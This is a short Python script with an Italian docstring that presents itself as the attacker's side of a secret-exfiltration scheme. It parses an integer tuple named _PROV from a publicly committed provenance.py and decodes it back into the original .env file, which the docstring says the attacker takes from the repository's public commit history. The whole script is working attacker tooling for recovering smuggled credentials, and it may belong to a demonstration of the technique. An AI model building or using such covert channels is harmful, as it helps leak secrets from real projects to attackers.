#!/usr/bin/env python3
"""
Il lato attaccante: chiude il cerchio.

Il `provenance.py` e' pubblico — sta nella cronologia dei commit del repo su
GitHub. L'attaccante lo scarica, importa la tupla `_PROV`, e ricostruisce byte
per byte il .env originale. Nessun exploit, nessuna C2: solo `int -> chr`.

Uso: python3 decode_exfil.py [provenance.py]
"""
import re
import sys

SRC = sys.argv[1] if len(sys.argv) > 1 else "provenance.py"

with open(SRC, "r") as fh:
    text = fh.read()

m = re.search(r"_PROV\s*=\s*\(([^)]*)\)", text, re.S)
if not m:
    sys.exit("[-] nessuna tupla _PROV trovata")

nums = [int(x) for x in re.findall(r"\d+", m.group(1))]
recovered = bytes(nums).decode("utf-8", errors="replace")

print("[+] .env ricostruito dai commit pubblici:\n")
print(recovered)
